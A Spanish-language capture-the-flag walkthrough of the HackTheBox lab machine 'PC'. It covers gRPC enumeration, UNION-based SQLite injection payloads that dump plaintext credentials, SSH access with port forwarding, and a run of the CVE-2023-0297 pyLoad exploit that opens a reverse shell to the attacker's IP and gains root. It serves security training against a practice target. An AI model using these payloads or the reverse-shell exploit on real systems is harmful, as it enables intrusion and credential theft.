---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PC

`PC` es una máquina Linux de dificultad fácil que cuenta con un punto final `gRPC` que es vulnerable a la inyección SQL. Después de enumerar y volcar el contenido de la base de datos, las credenciales de texto sin formato conducen al acceso `SSH` a la máquina. Al enumerar los puertos que se ejecutan localmente, se revela una versión obsoleta del servicio `pyLoad`, que es susceptible a la ejecución remota de código (RCE) previa a la autenticación a través de `CVE-2023-0297`. Como el servicio lo ejecuta `root`, explotar esta vulnerabilidad conduce a privilegios completamente elevados.

<figure><img src="../../.gitbook/assets/PC.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **PC**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.214 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 11:18 CET
Initiating SYN Stealth Scan at 11:18
Scanning 10.10.11.214 [65535 ports]
Discovered open port 22/tcp on 10.10.11.214
SYN Stealth Scan Timing: About 23.48% done; ETC: 11:20 (0:01:41 remaining)
SYN Stealth Scan Timing: About 51.90% done; ETC: 11:20 (0:00:57 remaining)
Discovered open port 50051/tcp on 10.10.11.214
Completed SYN Stealth Scan at 11:20, 101.72s elapsed (65535 total ports)
Nmap scan report for 10.10.11.214
Host is up, received user-set (0.032s latency).
Scanned at 2025-02-20 11:18:33 CET for 102s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 101.80 seconds
           Raw packets sent: 131146 (5.770MB) | Rcvd: 129 (7.692KB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.214
	[*] Open ports: 22,50051

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentra el servicio `SSH` en el puerto `22` expuesto y un servicio llamado `grpc` en el puerto `50051`.

```bash
❯ nmap -sCV -p22,50051 10.10.11.214 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 11:21 CET
Nmap scan report for 10.10.11.214
Host is up (0.059s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  grpc
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.19 (90%), Linux 5.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   81.20 ms 10.10.16.1
2   81.35 ms 10.10.11.214

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (424).png" alt=""><figcaption></figcaption></figure>

## gRPC Enumeration with grpcurl and gRPC UI

De los puertos expuestos que se encuentran en la máquina, solamente disponemos del puerto `50051` que corresponde al servicio de `gRPC` para tratar de buscar alguna vulnerabilidad, poder encontrar información que nos permite acceder al equipo, etc.

{% hint style="info" %}
gRPC es un sistema de llamada a procedimiento remoto de código abierto desarrollado inicialmente en Google. Utiliza como transporte HTTP/2 y Protocol Buffers como lenguaje de descripción de interfaz.
{% endhint %}

Realizando una búsqueda por Internet, nos encontramos con el siguiente blog en el cual nos mostraban diferentes técnicas y ejemplos de cómo enumerar el servicio de `gRPC` en el ámbito del `pentest`.

{% embed url="https://sanaullahamankorai.medium.com/penetration-testing-grpc-techniques-examples-and-code-snippets-d508f6c08783" %}

Para lograr interactuar con el servicio, decidimos utilizar la herramienta de [`grpcurl`](https://github.com/fullstorydev/grpcurl). En la propia documentación de la herramienta se nos mostraban diferentes ejemplos también del uso.

Al intentar realizar la enumeración, se nos mostraba un mensaje de error indicando que el servidor no respondió con el protocolo `TLS`, ya que `gRPC` normalmente funciona con `TLS` de manera predeterminada.

```bash
❯ grpcurl 10.10.11.214:50051 list
Failed to dial target host "10.10.11.214:50051": tls: first record does not look like a TLS handshake
```

Realizamos una comprobación del panel de ayuda de la herramienta y comprobamos que tenemos la opción `-plaintext` para indicar a `grpcurl`que no utilice `TLS`.

```bash
❯ grpcurl -h 2>&1 | grep TLS -2
  -plaintext
    	Use plain-text HTTP/2 when connecting to server (no TLS).
```

A través de la directiva `list`, hemos podido enumerar los servicios del servidor. En este caso, nos encontramos con un servicio llamado `SimpleApp` y otro denominado `ServerReflection`.

El servicio `ServerReflection` permite realizar consultas al servidor para obtener información sobre los servicios disponibles, como los métodos y tipos de mensajes que maneja, sin necesidad de tener acceso previo a los archivos `.proto`. Esto facilita la introspección dinámica del servidor y nos da visibilidad sobre su estructura, lo cual puede ser clave para interactuar con él de manera efectiva.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

Al ejecutar el comando `grpcurl` para listar los métodos disponibles en el servicio **SimpleApp**, encontramos las siguientes funciones disponibles:

* **SimpleApp.LoginUser**
* **SimpleApp.RegisterUser**
* **SimpleApp.getInfo**

Estos métodos nos permiten interactuar con el servicio y realizar diversas acciones, como iniciar sesión, registrar usuarios o recuperar información.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

Al ejecutar el comando `grpcurl` para describir el servicio `SimpleApp`, obtuvimos la siguiente estructura del servicio:

`SimpleApp` es un servicio que ofrece tres métodos RPC:

* **LoginUser**: Recibe un mensaje de tipo `.LoginUserRequest` y devuelve un mensaje de tipo `.LoginUserResponse`.
* **RegisterUser**: Recibe un mensaje de tipo `.RegisterUserRequest` y devuelve un mensaje de tipo `.RegisterUserResponse`.
* **getInfo**: Recibe un mensaje de tipo `.getInfoRequest` y devuelve un mensaje de tipo `.getInfoResponse`.

Estos métodos permiten interactuar con el servicio **SimpleApp** y realizar las operaciones correspondientes de acuerdo a los tipos de mensajes definidos.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

Al ejecutar el comando `grpcurl` para describir los mensajes asociados a los métodos del servicio `SimpleApp`, obtuvimos la siguiente estructura de mensajes:

1. **LoginUserRequest**:\
   Es un mensaje que contiene dos campos:
   * `username`: tipo `string`
   * `password`: tipo `string`
2. **LoginUserResponse**:\
   Es un mensaje que contiene un campo:
   * `message`: tipo `string`
3. **RegisterUserRequest**:\
   Es un mensaje que contiene dos campos:
   * `username`: tipo `string`
   * `password`: tipo `string`
4. **RegisterUserResponse**:\
   Es un mensaje que contiene un campo:
   * `message`: tipo `string`
5. **getInfoRequest**:\
   Es un mensaje que contiene un campo:
   * `id`: tipo `string`
6. **getInfoResponse**:\
   Es un mensaje que contiene un campo:
   * `message`: tipo `string`

Estos mensajes están estructurados para ser enviados y recibidos durante la ejecución de las funciones del servicio `SimpleApp`, facilitando la comunicación entre el cliente y el servidor.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserResponse
LoginUserResponse is a message:
message LoginUserResponse {
  string message = 1;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserResponse
RegisterUserResponse is a message:
message RegisterUserResponse {
  string message = 1;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoResponse
getInfoResponse is a message:
message getInfoResponse {
  string message = 1;
}
```

Al realizar la solicitud con `grpcurl` para registrar un nuevo usuario, hemos obtenido la siguiente respuesta.

Esto indica que se ha creado correctamente la cuenta para el usuario `gzzcoo1` con la contraseña `Gzzcoo123`.

```bash
❯ grpcurl -format text -d 'username: "gzzcoo1",password: "Gzzcoo123"' -plaintext 10.10.11.214:50051 SimpleApp.RegisterUser
message: "Account created for user gzzcoo1!"
```

Al realizar la solicitud con grpcurl para iniciar sesión con el usuario gzzcoo1 y la contraseña Gzzcoo123, obtuvimos la siguiente respuesta:

> **message: "Your id is 435."**

Además, en los encabezados de la respuesta, se nos entregó un token de autenticación válido:

> **token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZ3p6Y29vMSIsImV4cCI6MTc0MDAzMTMyNX0.P0skEoAiBqW6BiH6E4m1nOutqPax4bGItF0mg0BPcjo'**

Este token está asociado al usuario gzzcoo1 con el id 435 y puede usarse para realizar solicitudes autenticadas en futuras interacciones con el servicio SimpleApp.

```bash
❯ grpcurl -vv -format text -d 'username: "gzzcoo1",password: "Gzzcoo123"' -plaintext 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
message: "Your id is 435."

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZ3p6Y29vMSIsImV4cCI6MTc0MDAzMTMyNX0.P0skEoAiBqW6BiH6E4m1nOutqPax4bGItF0mg0BPcjo'
Sent 1 request and received 1 response
Timing Data: 576.425221ms
  Dial: 56.026738ms
    BlockingDial: 56.00054ms
  InvokeRPC: 358.309362ms
```

La respuesta que recibimos indica que la solicitud para obtener información a través del método `getInfo` fue rechazada debido a un error de autorización.

Esto significa que necesitamos incluir el token de autenticación en la cabecera de la solicitud para que el servidor nos permita acceder a la información. Podemos hacerlo añadiendo el token que recibimos anteriormente al encabezado `token`.

```bash
❯ grpcurl -format text -d 'id: "435"' -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "Authorization Error.Missing 'token' header"
```

Al incluir el token correctamente en la solicitud, hemos recibido la siguiente respuesta, la cual no nos ofrece ningún tipo de información interesante.

```bash
❯ TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZ3p6Y29vMSIsImV4cCI6MTc0MDAzMTMyNX0.P0skEoAiBqW6BiH6E4m1nOutqPax4bGItF0mg0BPcjo
❯ grpcurl -format text -d 'id: "435"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "Will update soon."
```

Por otro lado, también podemos hacer uso de la herramienta de `gRPC UI` para realizar los mismos comandos anteriores pero a través de una interfaz web.

```bash
❯ grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:41843/
```

Utilizaremos el servicio `SimpleApp` con el método `RegisterUser` y trataremos de registrar un usuario nuevo. Para enviar la solicitud le deberemos de dar a la opción de `Invoke`.

<figure><img src="../../.gitbook/assets/imagen (428).png" alt="" width="431"><figcaption></figcaption></figure>

En la respuesta por parte del servidor se nos muestra el mensaje indicando que la cuenta ha sido registrada correctamente, el mismo mensaje que se nos mostraba con `grpcurl`.

<figure><img src="../../.gitbook/assets/imagen (429).png" alt="" width="339"><figcaption></figcaption></figure>

Utilizaremos el método de `LoginUser` para iniciar sesión con el usuario recién creado, le daremos a `Invoke`nuevamente.

<figure><img src="../../.gitbook/assets/imagen (430).png" alt="" width="418"><figcaption></figcaption></figure>

En la respuesta por parte del servidor, se nos muestra la respuesta en la cual nos proporcionan nuestro `ID` y en el apartado de `Response Trailers` se nos proporciona el `Token` correspondiente a nuestro usuario.

<figure><img src="../../.gitbook/assets/imagen (431).png" alt="" width="563"><figcaption></figcaption></figure>

Por último, utilizaremos el método de `getInfo`para probar la funcionalidad de este método. Especificaremos nuestro `ID` y le añadiremos un nuevo valor `Token` en el apartado de `Request Metadata`.

<figure><img src="../../.gitbook/assets/imagen (432).png" alt="" width="497"><figcaption></figcaption></figure>

En la respuesta por parte del servidor, se nos muestra el mensaje de `Will update soon`, tal y como nos aparecía en la herramienta de `grpcurl`.

<figure><img src="../../.gitbook/assets/imagen (433).png" alt=""><figcaption></figcaption></figure>

## Initial Access

### SQL Injection in SQLite trough grpcurl (Enumerating Tables, Columns and Data)

Después de revisar los endpoints, vimos que no hay nada explotable a simple vista. Pero como el servicio maneja autenticación con usuarios, contraseñas e identificadores, es probable que haya una base de datos detrás. Esto nos abre la puerta a probar una posible inyección SQL (SQLi) si algún parámetro es vulnerable.

Para comprobarlo, empezamos a jugar con el parámetro **id** en `getInfo`. Un truco básico para detectar SQLi es usar `OR 1=1`, que si funciona, suele devolver un resultado válido sin importar el ID.

El mensaje de respuesta sugiere que la consulta se ejecutó sin error, lo que indica que podría haber SQLi en este punto.

```bash
❯ grpcurl -format text -d 'id: "435 OR 1=1"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "The admin is working hard to fix the issues."
```

Después de investigar los diferentes payloads para detectar la infraestructura de la base de datos, comprobamos que se trata de `SQLite`.

A través de `PayloadsAllTheThings` realizaremos las inyecciones SQL típicas para lograr extraer los datos de las bases de datos presentes.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" %}

El primer paso a realizar, será lograr determinar el total de columnas que dispone le base de datos, para así lograr inyectar el payload. En este caso, se confirma que la base de datos solamente dispone de una columna con una versión de `SQLite 3.31.1`.

```bash
❯ grpcurl -format text -d 'id: "435 UNION SELECT 1;"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "1"

❯ grpcurl -format text -d 'id: "435 UNION SELECT sqlite_version();"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "3.31.1"
```

A través de la siguiente inyección SQL, comprobamos las tablas presentes en la base de datos. En el resultado obtenido, verificamos la existencia de las tablas `accounts`y `messages`.

```bash
❯ grpcurl -format text -d "id: \"435 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';\"" -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "accounts,messages"
```

Enumeraremos las columnas presentes en la tabla `accounts`, en la cual se nos muestran las columnas `username`y `password`.

```bash
❯ grpcurl -format text -d "id: \"435 UNION SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('accounts');\"" -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "username,password"
```

Comprobaremos los datos de las columnas presentes en la tabla `accounts`. En el resultado obtenido, comprobamos que nos aparecen las credenciales del usuario `admin` y del usuario `sau`.

```bash
❯ grpcurl -format text -d 'id: "435 UNION SELECT GROUP_CONCAT(username || \":\" || password) FROM accounts;"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "admin:admin,sau:HereIsYourPassWord1431"
```

Probaremos de conectarnos al equipo mediante `SSH`, una vez comprobado el acceso verificaremos la flag **user.txt**.

```bash
❯ sshpass -p HereIsYourPassWord1431 ssh sau@10.10.11.214
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ cat user.txt 
bf851c74a***********************
```

## Privilege Escalation

### Discover Internal Web Server (SSH Port Forwarding)

En el equipo, después de una enumeración inicial básica comprobamos algunos puertos internos desconocidos, en el cual al realizar un `cURL` sobre ellos se nos mostraba una redirección a lo que parece ser a un panel de `login`.

<pre class="language-bash"><code class="lang-bash">sau@pc:~$ netstat -ano | grep LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::50051                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.

sau@pc:~$ curl 127.0.0.1:8000
&#x3C;!doctype html>
&#x3C;html lang=en>
&#x3C;title>Redirecting...&#x3C;/title>
&#x3C;h1>Redirecting...&#x3C;/h1>
&#x3C;p>You should be redirected automatically to the target URL: &#x3C;a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&#x3C;/a>. If not, click the link.
<strong>
</strong><strong>sau@pc:~$ curl 127.0.0.1:9666
</strong>&#x3C;!doctype html>
&#x3C;html lang=en>
&#x3C;title>Redirecting...&#x3C;/title>
&#x3C;h1>Redirecting...&#x3C;/h1>
&#x3C;p>You should be redirected automatically to the target URL: &#x3C;a href="/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F">/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F&#x3C;/a>. If not, click the link.
</code></pre>

Después de identificar los puertos `8000` y `9666` corriendo en `localhost`, establecemos un `port forwarding` con SSH para exponerlos en nuestra máquina.

Esto nos permite acceder a los servicios en [http://127.0.0.1:8000](http://127.0.0.1:8000) y [http://127.0.0.1:9666](http://127.0.0.1:9666) desde nuestro navegador, como si estuvieran corriendo en nuestra máquina local. Ahora podemos interactuar con ellos y buscar posibles vulnerabilidades.

```bash
❯ sshpass -p HereIsYourPassWord1431 ssh -L 8000:127.0.0.1:8000 -L 9666:127.0.0.1:9666 sau@10.10.11.214
Last login: Thu Feb 20 03:36:26 2025 from 10.10.16.3
sau@pc:~$ 
```

Accederemos a [http://localhost:8000](http://localhost:8000) y comprobaremos que se trata de una página de inicio de sesión de `pyLoad`.

{% hint style="info" %}
pyLoad es un gestor de descargas rápido, ligero y completo para muchos formatos de contenedores One-Click-Hoster como DLC, sitios de vídeo o simplemente enlaces http/ftp . Su objetivo es que los requisitos de hardware sean bajos y que la plataforma sea independiente para que pueda ejecutarse en todo tipo de sistemas (computadora de escritorio, netbook, NAS, enrutador).
{% endhint %}

<figure><img src="../../.gitbook/assets/5174_vmware_7198sIDIMU.png" alt=""><figcaption></figcaption></figure>

A través de una búsqueda por Internet, comprobaremos las credenciales que se utilizan por defecto en `pyLoad`.

<figure><img src="../../.gitbook/assets/imagen (434).png" alt=""><figcaption></figcaption></figure>

Al tratar de iniciar sesión las credenciales `pyload/pyload` se nos mostraba un mensaje de error indicando que las credenciales proporcionadas no eran válidas.

<figure><img src="../../.gitbook/assets/imagen (435).png" alt="" width="512"><figcaption></figcaption></figure>

### pyLoad 0.5.0 Exploitation - Prea-auth Remote Code Execution \[RCE] (CVE-2023-0297)

Volvemos al equipo víctima y verificaremos quién es el usuario que está ejecutando el `pyLoad`, en este caso se verifica que es el usuario `root`. Por otro lado, también logramos comprobar la versión exacta del servicio de `pyLoad`.

<pre class="language-bash"><code class="lang-bash">sau@pc:~$ ps aux | grep pyload
root        1045  0.0  1.6 1217800 65964 ?       Ssl  02:20   0:03 /usr/bin/python3 /usr/local/bin/pyload
sau         1881  0.0  0.0   8160  2396 pts/0    S+   03:39   0:00 grep --color=auto pyload
<strong>
</strong><strong>sau@pc:~$ /usr/local/bin/pyload --version
</strong>pyLoad 0.5.0
</code></pre>

Realizaremos una búsqueda con `searchsploit` para verificar si existe alguna vulnerabilidad conocida para `pyLoad`. En el resultado que hemos obtenido, comprobamos que existe una vulnerabilidad de `Pre-auth RCE` para la versión exacta que está levantado en el sistema víctima, con lo cual podríamos intentar explotar dicha vulnerabilidad reportada como `CVE-2023-0297`.

```bash
❯ searchsploit pyLoad
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)                                                                                                                                                | python/webapps/51532.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

{% embed url="https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-0297" %}

{% hint style="danger" %}
Inyección de código en el repositorio de GitHub pyload/pyload anterior a 0.5.0b3.dev31.
{% endhint %}

Realizando una búsqueda por Internet, nos encontramos con el siguiente repositorio de GitHub en el cual nos proporcionan un exploit para aprovecharnos de la vulnerabilidad.

{% embed url="https://github.com/JacobEbben/CVE-2023-0297" %}

```bash
❯ git clone https://github.com/JacobEbben/CVE-2023-0297; cd CVE-2023-0297
Clonando en 'CVE-2023-0297'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 10 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (10/10), 4.13 KiB | 1.38 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```

Nos pondremos en escucha con `nc`para recibir la Reverse Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Realizaremos la ejecución del exploit sobre la URL vulnerable donde está el `pyLoad`, en este caso, utilizaremos [http://localhost:8000](http://localhost:8000) debido que hemos aplicado `Port-Forwarding` e indicaremos nuestra dirección y puerto de atacante donde recibiremos la Reverse Shell.

```bash
❯ python3 exploit.py -t http://localhost:8000 -I 10.10.16.3 -P 443
[SUCCESS] Running reverse shell. Check your listener!
```

Comprobaremos que hemos recibido la conexión al equipo victima y nos encontramos como `root` debido que el usuario que levantaba el servicio de `pyLoad` era él, por lo tanto, los comandos inyectados se ejecutarán como dicho usuario.&#x20;

Finalmente logramos obtener la flag **root.txt**.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.214] 50060
bash: cannot set terminal process group (1045): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# cat /root/root.txt
cat /root/root.txt
f12c72922d************************
```

### Analyzing how works payload

Analizaremos el exploit para verificar cómo funciona por detrás. Para ello, a través de la variable de entorno `HTTP_PROXY` indicaremos la dirección IP de nuestro `localhost` por el puerto `8080`que es donde tenemos configurado `BurpSuite`.

Una vez indicado el proxy, ejecutaremos el exploit para que por ejemplo ejecute el comando `whoami`.

```bash
❯ HTTP_PROXY=http://127.0.0.1:8080 python3 exploit.py -t http://localhost:8000 -c 'whoami > /tmp/whoami'
[SUCCESS] Running your command: "whoami > /tmp/whoami"!
```

En la solicitud que se intercepta a través de `BurpSuite`, se verifica que para aprovecharnos de la vulnerabilidad se realiza una solicitud por el método `POST` al endpoint `/flash/addcrypted2`.

Posteriormente, se importa a realizar la importación de la librería `os` y se realiza la ejecución del payload, posteriormente se declaran funciones y variables necesarias para la explotación de la vulnerabilidad.

<figure><img src="../../.gitbook/assets/imagen (425).png" alt=""><figcaption></figcaption></figure>

En este ejemplo, verificamos el funcionamiento de la vulnerabilidad a través de la solicitud por `POST` que tramitamos a través de `BurpSuite`.

<figure><img src="../../.gitbook/assets/5177_vmware_r7HrtyzDIO.png" alt=""><figcaption></figcaption></figure>
